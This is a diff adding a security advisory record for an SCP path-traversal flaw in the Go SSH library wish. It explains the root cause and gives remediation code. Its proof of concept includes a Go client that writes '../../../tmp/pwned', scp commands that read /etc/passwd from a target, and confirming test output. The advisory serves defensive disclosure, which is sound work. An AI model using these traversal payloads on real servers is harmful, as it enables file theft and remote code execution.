@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-xjvp-7243-rg9h",
+  "modified": "2026-04-18T01:19:59.807092Z",
+  "published": "2026-04-18T01:09:46Z",
+  "summary": "Wish has SCP Path Traversal that allows arbitrary file read/write",
+  "details": "## Summary\n\nThe SCP middleware in `charm.land/wish/v2` is vulnerable to path traversal attacks. A malicious SCP client can read arbitrary files from the server, write arbitrary files to the server, and create directories outside the configured root directory by sending crafted filenames containing `../` sequences over the SCP protocol.\n\n## Affected Versions\n\n- `charm.land/wish/v2` — all versions through commit `72d67e6` (current `main`)\n- `github.com/charmbracelet/wish` — likely all v1 versions (same code pattern)\n\n## Details\n\n### Root Cause\n\nThe `fileSystemHandler.prefixed()` method in `scp/filesystem.go:42-48` is intended to confine all file operations to a configured root directory. However, it fails to validate that the resolved path remains within the root:\n\n```go\nfunc (h *fileSystemHandler) prefixed(path string) string {\n    path = filepath.Clean(path)\n    if strings.HasPrefix(path, h.root) {\n        return path\n    }\n    return filepath.Join(h.root, path)\n}\n```\n\nWhen `path` contains `../` components, `filepath.Clean` resolves them but does not reject them. The subsequent `filepath.Join(h.root, path)` produces a path that escapes the root directory.\n\n### Attack Vector 1: Arbitrary File Write (scp -t)\n\nWhen receiving files from a client (`scp -t`), filenames are parsed from the SCP protocol wire using regexes that accept arbitrary strings:\n\n```go\nreNewFile   = regexp.MustCompile(`^C(\\d{4}) (\\d+) (.*)$`)\nreNewFolder = regexp.MustCompile(`^D(\\d{4}) 0 (.*)$`)\n```\n\nThe captured filename is used directly in `filepath.Join(path, name)` without sanitization (`scp/copy_from_client.go:90,140`), then passed to `fileSystemHandler.Write()` and `fileSystemHandler.Mkdir()`, which call `prefixed()` — allowing the attacker to write files and create directories anywhere on the filesystem.\n\n### Attack Vector 2: Arbitrary File Read (scp -f)\n\nWhen sending files to a client (`scp -f`), the requested path comes from the SSH command arguments (`scp/scp.go:284`). This path is passed to `handler.Glob()`, `handler.NewFileEntry()`, and `handler.NewDirEntry()`, all of which call `prefixed()` — allowing the attacker to read any file accessible to the server process.\n\n### Attack Vector 3: File Enumeration via Glob\n\nThe `Glob` method passes user input containing glob metacharacters (`*`, `?`, `[`) to `filepath.Glob` after `prefixed()`, enabling enumeration of files outside the root.\n\n## Proof of Concept\n\nAll three vectors were validated with end-to-end integration tests against a real SSH server using the public `wish` and `scp` APIs.\n\n### Vulnerable Server\n\nAny server using `scp.NewFileSystemHandler` with `scp.Middleware` is affected. This is the pattern shown in the official `examples/scp` example:\n\n```go\npackage main\n\nimport (\n\t\"net\"\n\n\t\"charm.land/wish/v2\"\n\t\"charm.land/wish/v2/scp\"\n\t\"github.com/charmbracelet/ssh\"\n)\n\nfunc main() {\n\thandler := scp.NewFileSystemHandler(\"/srv/data\")\n\ts, _ := wish.NewServer(\n\t\twish.WithAddress(net.JoinHostPort(\"0.0.0.0\", \"2222\")),\n\t\twish.WithMiddleware(scp.Middleware(handler, handler)),\n\t\t// Default: accepts all connections (no auth configured)\n\t)\n\ts.ListenAndServe()\n}\n```\n\n### Write Traversal — Write arbitrary files outside /srv/data\n\nAn attacker crafts SCP protocol messages with `../` in the filename. This can be done with a custom SCP client or by sending raw bytes over an SSH channel. The following Go program connects to the vulnerable server and writes a file to `/tmp/pwned`:\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\tgossh \"golang.org/x/crypto/ssh\"\n)\n\nfunc main() {\n\tconfig := \u0026gossh.ClientConfig{\n\t\tUser:            \"attacker\",\n\t\tAuth:            []gossh.AuthMethod{gossh.Password(\"anything\")},\n\t\tHostKeyCallback: gossh.InsecureIgnoreHostKey(),\n\t}\n\tclient, _ := gossh.Dial(\"tcp\", \"target:2222\", config)\n\tsession, _ := client.NewSession()\n\n\t// Pipe crafted SCP protocol data into stdin\n\tstdin, _ := session.StdinPipe()\n\tgo func() {\n\t\t// Wait for server's NULL ack, then send traversal payload\n\t\tbuf := make([]byte, 1)\n\t\tsession.Stdout.(interface{ Read([]byte) (int, error) }) // read ack\n\n\t\t// File header with traversal: writes to /tmp/pwned (escaping /srv/data)\n\t\tfmt.Fprintf(stdin, \"C0644 12 ../../../tmp/pwned\\n\")\n\t\t// Wait for ack\n\t\tstdin.Write([]byte(\"hello world\\n\"))\n\t\tstdin.Write([]byte{0}) // NULL terminator\n\t\tstdin.Close()\n\t}()\n\n\t// Tell the server we're uploading to \".\"\n\tsession.Run(\"scp -t .\")\n}\n```\n\nOr equivalently using standard `scp` with a symlink trick, or by patching the openssh `scp` client to send a crafted filename.\n\n### Read Traversal — Read arbitrary files outside /srv/data\n\nNo custom tooling needed. Standard `scp` passes the path directly:\n\n```bash\n# Read /etc/passwd from a server whose SCP root is /srv/data\nscp -P 2222 attacker@target:../../../etc/passwd ./stolen_passwd\n```\n\nThe server resolves `../../../etc/passwd` through `prefixed()`:\n1. `filepath.Clean(\"../../../etc/passwd\")` → `\"../../../etc/passwd\"`\n2. Not prefixed with `/srv/data`, so: `filepath.Join(\"/srv/data\", \"../../../etc/passwd\")` → `\"/etc/passwd\"`\n3. File contents of `/etc/passwd` are sent to the attacker.\n\n### Glob Traversal — Enumerate and read files outside /srv/data\n\n```bash\nscp -P 2222 attacker@target:'../../../etc/pass*' ./\n```\n\n### Validated Test Output\n\nThese were confirmed with integration tests using `wish.NewServer`, `scp.Middleware`, and `scp.NewFileSystemHandler` against temp directories. The tests created a root directory and a sibling \"secret\" directory, then verified files were read/written across the boundary:\n\n```\n=== RUN   TestPathTraversalWrite\n    PATH TRAVERSAL CONFIRMED: file written to \".../secret/pwned\" (outside root \".../scproot\")\n--- FAIL: TestPathTraversalWrite\n\n=== RUN   TestPathTraversalWriteRecursiveDir\n    PATH TRAVERSAL CONFIRMED: directory created at \".../evil_dir\" (outside root \".../scproot\")\n    PATH TRAVERSAL CONFIRMED: file written to \".../evil_dir/payload\" (outside root \".../scproot\")\n--- FAIL: TestPathTraversalWriteRecursiveDir\n\n=== RUN   TestPathTraversalRead\n    PATH TRAVERSAL CONFIRMED: read file outside root, got content: \"...super-secret-password...\"\n--- FAIL: TestPathTraversalRead\n\n=== RUN   TestPathTraversalGlob\n    PATH TRAVERSAL VIA GLOB CONFIRMED: read file outside root, got content: \"...super-secret-password...\"\n--- FAIL: TestPathTraversalGlob\n```\n\nTests used the real SSH handshake via `golang.org/x/crypto/ssh`, real SCP protocol parsing, and real filesystem operations — confirming the vulnerability is exploitable end-to-end.\n\n## Impact\n\nAn authenticated SSH user can:\n\n- **Write arbitrary files** anywhere on the filesystem the server process can write to, leading to remote code execution via cron jobs, SSH `authorized_keys`, shell profiles, or systemd units.\n- **Read arbitrary files** accessible to the server process, including `/etc/shadow`, private keys, database credentials, and application secrets.\n- **Create arbitrary directories** on the filesystem.\n- **Enumerate files** outside the root via glob patterns.\n\nIf the server uses the default authentication configuration (which accepts all connections — see `wish.go:19`), these attacks are exploitable by unauthenticated remote attackers.\n\n## Remediation\n\n### Fix `prefixed()` to enforce root containment\n\n```go\nfunc (h *fileSystemHandler) prefixed(path string) (string, error) {\n    // Force path to be relative by prepending /\n    joined := filepath.Join(h.root, filepath.Clean(\"/\"+path))\n    // Verify the result is still within root\n    if !strings.HasPrefix(joined, h.root+string(filepath.Separator)) \u0026\u0026 joined != h.root {\n        return \"\", fmt.Errorf(\"path traversal detected: %q resolves outside root\", path)\n    }\n    return joined, nil\n}\n```\n\n### Sanitize filenames in `copy_from_client.go`\n\nSCP filenames should never contain path separators or `..` components:\n\n```go\nname := match[3] // or matches[0][2] for directories\nif strings.ContainsAny(name, \"/\\\\\") || name == \"..\" || name == \".\" {\n    return fmt.Errorf(\"invalid filename: %q\", name)\n}\n```\n\n### Validate `info.Path` in `GetInfo` or at the middleware entry point\n\n```go\ninfo.Path = filepath.Clean(\"/\" + info.Path)\n```\n\n## Credit\n\nEvan MORVAN (evnsh) — me@evan.sh (Research)\nClaude Haiku (formatting the report)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "charm.land/wish/v2",
+        "purl": "pkg:golang/charm.land/wish/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xjvp-7243-rg9h/GHSA-xjvp-7243-rg9h.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/charmbracelet/wish",
+        "purl": "pkg:golang/github.com/charmbracelet/wish"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.4.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-xjvp-7243-rg9h/GHSA-xjvp-7243-rg9h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/charmbracelet/wish/security/advisories/GHSA-xjvp-7243-rg9h"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/charmbracelet/wish"
+    }
+  ]
+}
